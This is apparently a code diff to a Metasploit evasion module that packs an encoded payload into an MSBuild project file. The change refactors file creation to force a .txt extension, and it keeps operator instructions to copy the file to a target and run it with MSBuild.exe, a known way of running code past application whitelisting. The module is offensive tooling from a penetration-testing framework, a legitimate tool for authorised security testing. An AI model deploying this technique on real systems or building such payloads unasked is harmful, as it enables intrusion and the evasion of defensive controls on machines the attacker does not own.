@@ -37,15 +37,6 @@ class MetasploitModule < Msf::Evasion
     Rex::Text.encode_base64(payload.encoded)
   end
 
-  def instructions
-    print_status "Copy #{datastore['FILENAME']} to the target"
-    if payload.arch.first == ARCH_X86
-      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
-    else
-      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
-    end
-  end
-
   def obfu
     Rex::Text.rand_text_alpha 8
   end
@@ -108,8 +99,29 @@ class MetasploitModule < Msf::Evasion
     HEREDOC
   end
 
+  def file_format_filename(name = '')
+    name.empty? ? @fname : @fname = name
+  end
+
+  def create_files
+    f1 = datastore['FILENAME'].empty? ? 'msbuild.txt' : datastore['FILENAME']
+    f1 << '.txt' unless f1.downcase.end_with?('.txt')
+    file1 = msbuild
+    file_format_filename(f1)
+    file_create(file1)
+  end
+
+  def instructions
+    print_status "Copy #{datastore['FILENAME']} to the target"
+    if payload.arch.first == ARCH_X86
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
+    else
+      print_status "Execute using: C:\\Windows\\Microsoft.Net\\Framework64\\[.NET Version]\\MSBuild.exe #{datastore['FILENAME']}"
+    end
+  end
+
   def run
-    file_create(msbuild)
+    create_files
     instructions
   end
 end
